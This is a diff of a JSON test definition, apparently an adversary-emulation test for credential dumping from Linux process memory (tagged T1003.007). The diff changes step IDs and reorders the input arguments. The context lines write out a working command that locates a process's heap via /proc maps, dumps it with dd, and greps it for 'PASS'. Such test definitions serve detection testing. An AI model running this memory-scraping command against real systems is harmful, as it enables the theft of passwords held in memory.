@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
+      "id": "ec314f8d-f586-45dc-8a70-ec809043f0a1",
       "type": "execute-command",
       "data": {
         "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "f7f3a082-f055-4601-a07a-c05521b5277a",
+      "id": "0c258d8d-c131-4d70-b4f0-94fbe93f21a3",
       "type": "execute-command",
       "data": {
         "command": "rm -f \"#{output_file}\"",
@@ -25,7 +25,7 @@
       "elevation_required": true
     },
     {
-      "id": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
+      "id": "a4d9e1db-5523-4526-a372-48f8d3b3c28c",
       "name": "Check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": true
     },
     {
-      "id": "9d3de7fb-39e7-4e51-80c6-7e6bda900432",
+      "id": "0b03248f-0b1c-4848-a9cc-7c26d6f719cd",
       "name": "Resolve dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": true
     },
     {
-      "id": "0dea4e88-e341-4ed9-b047-527f200c23aa",
+      "id": "4f07b344-a858-452a-bf5c-de782e49c330",
       "name": "Re-check dependency 1/1",
       "description": "Script to launch target process must exist\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
+      "s": "ec314f8d-f586-45dc-8a70-ec809043f0a1",
       "p": "on-success",
-      "o": "f7f3a082-f055-4601-a07a-c05521b5277a"
+      "o": "0c258d8d-c131-4d70-b4f0-94fbe93f21a3"
     },
     {
-      "s": "5b6b63a0-c369-4d6e-8e37-334665e20d42",
+      "s": "ec314f8d-f586-45dc-8a70-ec809043f0a1",
       "p": "on-failure",
-      "o": "f7f3a082-f055-4601-a07a-c05521b5277a"
+      "o": "0c258d8d-c131-4d70-b4f0-94fbe93f21a3"
     },
     {
-      "s": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
+      "s": "a4d9e1db-5523-4526-a372-48f8d3b3c28c",
       "p": "on-success",
-      "o": "5b6b63a0-c369-4d6e-8e37-334665e20d42"
+      "o": "ec314f8d-f586-45dc-8a70-ec809043f0a1"
     },
     {
-      "s": "b2f6aed3-c7f4-4d24-9300-a38a71507556",
+      "s": "a4d9e1db-5523-4526-a372-48f8d3b3c28c",
       "p": "on-failure",
-      "o": "9d3de7fb-39e7-4e51-80c6-7e6bda900432"
+      "o": "0b03248f-0b1c-4848-a9cc-7c26d6f719cd"
     },
     {
-      "s": "9d3de7fb-39e7-4e51-80c6-7e6bda900432",
+      "s": "0b03248f-0b1c-4848-a9cc-7c26d6f719cd",
       "p": "on-success",
-      "o": "0dea4e88-e341-4ed9-b047-527f200c23aa"
+      "o": "4f07b344-a858-452a-bf5c-de782e49c330"
     },
     {
-      "s": "0dea4e88-e341-4ed9-b047-527f200c23aa",
+      "s": "4f07b344-a858-452a-bf5c-de782e49c330",
       "p": "on-failure",
-      "o": "5b6b63a0-c369-4d6e-8e37-334665e20d42"
+      "o": "ec314f8d-f586-45dc-8a70-ec809043f0a1"
     }
   ],
   "tags": [
@@ -95,12 +95,6 @@
     "T1003.007"
   ],
   "input_arguments": [
-    {
-      "name": "output_file",
-      "type": "path",
-      "description": "Path where captured results will be placed",
-      "value": "/tmp/T1003.007.bin"
-    },
     {
       "name": "script_path",
       "type": "path",
@@ -112,6 +106,12 @@
       "type": "string",
       "description": "Unique string to use to identify target process",
       "value": "T1003.007"
+    },
+    {
+      "name": "output_file",
+      "type": "path",
+      "description": "Path where captured results will be placed",
+      "value": "/tmp/T1003.007.bin"
     }
   ]
 }
